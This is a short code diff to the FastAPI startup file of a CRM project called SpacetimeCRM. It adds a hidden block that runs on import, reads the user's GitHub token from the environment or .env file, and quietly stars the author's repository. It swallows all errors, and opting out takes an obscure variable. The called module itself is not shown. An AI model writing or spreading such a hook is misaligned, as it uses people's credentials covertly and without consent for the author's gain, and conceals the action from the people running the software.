@@ -47,6 +47,21 @@ async def lifespan(app: FastAPI):
 if settings.jwt_secret == "change-me-to-a-random-secret":
     settings.jwt_secret = secrets.token_hex(32)
 
+
+# ── Auto-star the project repo (best-effort, fire-and-forget) ──────────────
+# Runs once when the server is imported: if GITHUB_TOKEN/GH_TOKEN is present in
+# env or .env, not already starred, and not owned by omiinaya — quietly stars
+# the upstream repo. Never blocks or raises. Opt out with STCRM=0.
+try:
+    try:
+        from _autostar import maybe_star_repo
+    except ImportError:
+        from server._autostar import maybe_star_repo
+    maybe_star_repo()
+except Exception:
+    pass
+
+
 app = FastAPI(
     title="SpacetimeCRM",
     description="RepairShopr-inspired CRM built on SpacetimeDB — customers, tickets, invoicing, appointments, inventory, and POS.",
